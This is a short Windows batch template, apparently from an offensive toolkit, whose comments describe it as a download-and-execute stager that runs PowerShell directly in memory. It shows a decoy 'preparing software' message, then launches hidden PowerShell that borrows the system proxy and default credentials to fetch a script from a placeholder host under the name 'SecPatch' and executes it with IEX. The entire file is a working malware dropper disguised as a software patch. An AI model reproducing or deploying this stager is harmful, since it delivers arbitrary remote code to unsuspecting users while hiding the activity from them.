:: batch template | Author: r00t-3xp10it
:: download/execute powershell direct into ram
:: ---
@echo off
echo [*] Please wait, preparing software ...
powershell.exe -nop -w hidden -c $r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $r.downloadstring('http://SRVHOST:8080/SecPatch');

